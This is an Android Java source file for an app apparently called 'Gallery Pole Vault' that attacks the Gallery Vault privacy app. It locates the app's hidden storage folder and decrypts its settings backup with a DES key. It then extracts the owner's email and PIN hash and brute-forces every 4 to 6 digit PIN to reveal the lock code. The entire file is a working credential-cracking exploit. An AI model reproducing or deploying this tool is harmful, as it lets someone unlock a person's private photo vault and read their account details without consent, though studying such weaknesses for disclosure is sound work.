package com.treycorp.gallerypolevault;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.Environment;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.math.RoundingMode;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.DecimalFormat;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;


public class MainActivity extends AppCompatActivity {

    private ProgressDialog dialog;
    private TextView detectedTextView;
    private TextView vaultLocationTextView;
    private TextView launchTimeTextView;
    private TextView emailTextView;
    private TextView pinTextView;
    private File vaultDir;

    private String vaultIdentifier = ".galleryvault_DoNotDelete_"; // Search keyword for Gallery Vault directory
    private static final int PERMISSION_REQUEST_READ_STORAGE = 1;

    private String pinHash;
    private String pinCode;

    private Thread thread;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        dialog = new ProgressDialog(MainActivity.this);
        detectedTextView = findViewById(R.id.detectedTextView);
        vaultLocationTextView = findViewById(R.id.vaultLocationTextView);
        launchTimeTextView = findViewById(R.id.launchTimesTextView);
        emailTextView = findViewById(R.id.emailTextView);
        pinTextView = findViewById(R.id.pinTextView);

        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);


        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_READ_STORAGE);
        } else {
            jumpstart();
        }

    }

    private void toaster(String bread) {
        Toast.makeText(this, bread, Toast.LENGTH_SHORT).show();
        Log.d("Toaster", bread);
    }

    private void jumpstart() {
        dialog.setTitle("Initializing");
        dialog.show();

        // Find location of Gallery Vault ExternalStorage directory
        if (findApp("com.thinkyeah.galleryvault")) {
            detectedTextView.setText("Installed");
            findVault();
            if (!findVault()) {
                return;
            }
        } else {
            detectedTextView.setText("NOT installed!");
            dialog.dismiss();
            toaster("Gallery Vault not installed");
        }
        dialog.setTitle("Breaching The Vault");
        if (enterVault()) {
            thread = new Thread(new Runnable(){
                @Override
                public void run(){
                    crackPin();
                }
            });
            thread.start();
        }
        //dialog.dismiss();
    }


    private void crackPin() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                dialog.cancel();
                dialog = new ProgressDialog(MainActivity.this);
                dialog.setIndeterminate(true);
                dialog.setTitle("Pole Vaulting");
                dialog.setCancelable(false);

                dialog.show();
            }
        });
        final long startTime = System.nanoTime();
        int min = 4;
        int max = 6;

        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        for (int i = min; i <= max; i++) {
            final int x = i;


            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    dialog.setMessage("Cracking " + String.valueOf(x) + " Digit Pin");
                }
            });

            for (int v = 0; v < Math.pow(10, i); v++) {



                final String number = String.format("%0" + String.valueOf(i) + "d", v);
                byte[] messageDigest = md.digest(number.getBytes());
                BigInteger no = new BigInteger(1, messageDigest);

                // Convert message digest into hex value
                String hashtext = no.toString(16);
                while (hashtext.length() < 32) {
                    hashtext = "0" + hashtext;
                }
                messageDigest = null;
                no = null;
                //Log.d("Brute", hashtext);
                if (hashtext.equals(pinHash.toLowerCase())) {
                    Log.d("Brute", "Cracked");
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {

                            long endTime = System.nanoTime();

                            DecimalFormat df = new DecimalFormat("#.###");
                            df.setRoundingMode(RoundingMode.CEILING);

                            dialog.setMessage("Cracked");
                            toaster(String.format("Cracked pin in %s seconds",  df.format((endTime - startTime) / 1000000000.0)));
                            pinCode = number;

                            pinTextView.setVisibility(View.VISIBLE);
                            pinTextView.setText(pinCode);
                            dialog.dismiss();
                            //SET PIN
                        }
                    });
                    return;
                } else {
                    //Log.d("HASH", hashtext + "\t" + pinHash);
                }

            }
        }

    }

    private boolean findApp(String packageName) {
        dialog.setMessage("Searching for application");
        try {
            this.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private boolean findVault() {
        dialog.setMessage("Loading Filesystem");
        // Checks to see if external storage is available
        if (!Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState()) && !Environment.MEDIA_MOUNTED_READ_ONLY.equals(Environment.getExternalStorageState())) {
            dialog.setMessage("Failed to access external storage");
            dialog.hide();
            toaster("Failed to access external storage");
            return false;
        }

        // Search for GalleryVault directory
        dialog.setMessage("Searching for Gallery Vault data directory");
        File directv = Environment.getExternalStorageDirectory();
        File[] files = directv.listFiles();

        // Might be null if we lack permissions
        if (files == null) {
            vaultLocationTextView.setText("Error");
            toaster("External Storage Directory Error");
            dialog.hide();
            return false;
        }
        boolean foundVault = false;
        for (File file : files) {
            if (file.getName().contains(vaultIdentifier)) {
                directv = file;
                foundVault = true;
                vaultLocationTextView.setText(file.getName());
            }
        }
        if (!foundVault) {
            toaster("Could not find vault directory");
            dialog.hide();
            return false;
        }

        vaultDir = directv;

        return true;
    }

    private boolean enterVault() {
        dialog.setMessage("Loading vault database");
        File vault = new File(vaultDir.getAbsolutePath() + "/backup/setting.backup");
        if (!vault.exists()) {
            vaultLocationTextView.setText("NON EXISTENT!");
            dialog.dismiss();
            toaster("Failed to breach the vault. Database non-existent");
            return false;
        }


        StringBuffer datax = new StringBuffer("");
        try {
            FileInputStream fIn = new FileInputStream(vault.getAbsolutePath());
            InputStreamReader isr = new InputStreamReader ( fIn ) ;
            BufferedReader buffreader = new BufferedReader ( isr ) ;

            String readString = buffreader.readLine ( ) ;
            while ( readString != null ) {
                datax.append(readString);
                readString = buffreader.readLine ( ) ;
            }

            isr.close ( ) ;
        } catch ( IOException ioe ) {
            ioe.printStackTrace ( ) ;
        }

        //Log.d("Vault", datax.toString());
        //byte[] bytesDecoded = new BigInteger(datax.toString(),16).toByteArray();

        byte[] bytesDecoded = new byte[0];
        bytesDecoded = hexStringToByteArray(datax.toString());
        //bytesDecoded = datax.toString().getBytes("UTF-8");


        dialog.setMessage("Decrypting the vault");
        String settingsKeyString = getString(R.string.settingsKey).substring(0, 8);
        String result = "";
        try {

            SecretKeySpec key = new SecretKeySpec(settingsKeyString.getBytes(), "DES");
            //Log.d("key", key.toString());
            Cipher instance = Cipher.getInstance("DES/ECB/ZeroBytePadding");
            instance.init(Cipher.DECRYPT_MODE, key);
            result = new String(instance.doFinal(bytesDecoded ), "UTF8");

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();

        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        dialog.setMessage("Parsing database");

        try {
            JSONObject jsonObject = new JSONObject(result);
            launchTimeTextView.setText(jsonObject.getString("LaunchTimes"));
            emailTextView.setText(jsonObject.getString("AuthenticationEmail"));
            pinHash = jsonObject.getString("LockPin").substring(40, 72);
            return true;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        //Log.d("Vault", result);

        return false;
    }

    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len/2];

        for(int i = 0; i < len; i+=2){
            data[i/2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i+1), 16));
        }

        return data;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_READ_STORAGE: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    jumpstart();
                } else {
                    toaster("Storage permission denied");
                }
                return;
            }
        }
    }


}
